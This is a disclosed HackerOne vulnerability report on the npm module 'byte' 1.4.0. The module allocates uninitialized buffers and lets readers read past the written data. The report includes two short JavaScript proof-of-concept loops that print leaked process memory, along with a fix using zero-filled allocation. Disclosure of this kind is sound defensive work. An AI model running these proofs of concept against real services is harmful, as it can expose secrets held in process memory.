# `byte` allocates uninitialized buffers and reads data from them past the initialized length

## Report Details
- **Report ID**: 330351
- **URL**: https://hackerone.com/reports/330351
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-03-27T13:37:06.258Z
- **Disclosed**: 2018-05-11T20:25:26.435Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a memory exposure vulnerbaility in `byte`
It allows to extract process memory using Buffers in some cases.

# Module

**module name:** `byte`
**version:** 1.4.0
**npm page:** `https://www.npmjs.com/package/byte`

## Module Description

> Input Buffer and Output Buffer, just like Java ByteBuffer.

## Module Stats

705 downloads in the last day
3 836 downloads in the last week
14 813 downloads in the last month

# Vulnerability

## Vulnerability Description

`byte` allocates uninitialized buffers on all Node.js versions, even on the ones that zero-full `new Buffer()` by default, as it uses `.allocUnsafe()`. It provides an API for writing data and an API for reading data from the buffer, but the internal buffer is not zero-filled and the API for reading does not validate that the memory being read was ever initialized.

I also don't think this corresponds to behavior  of the Java ByteBuffer — that one is zero-filled afaik.

## Steps To Reproduce:

```js
var ByteBuffer = require('byte');
for (let k = 0; k < 1e4; k++) {
  var bb = new ByteBuffer();
  for (let i = 0; i < 180; i++) {
    bb.putString('ok');
  }
  const s = bb.getString(1000);
  if (s.includes(' {')) {
    console.log(s);
    console.log('Finished at attempt: ' + k);
    break;
  }
}
```

```js
var ByteBuffer = require('byte');
for (let k = 0; k < 1e4; k++) {
  var bb = ByteBuffer.allocate(50);
  const twos = Buffer.alloc(10, 2);
  for (let i = 0; i < 7; i++) bb.put(twos, 10);
  const s = bb.get(0, 100);
  if (s.includes(' {')) {
    console.log(s.toString('utf-8'));
    console.log('Finished at attempt: ' + k);
    break;
  }
}
```

## Patch

Replace all `Buffer(num)` and `Buffer.allocUnsafe(num)` usage with `Buffer.alloc(num)` and use a polyfill, e.g. [safer-buffer](https://www.npmjs.com/package/safer-buffer) or [buffer-alloc](https://www.npmjs.com/package/buffer-alloc).

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.9.0
- npm 5.8.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Read process memory containing sensitive information.

## Attachments
No attachments
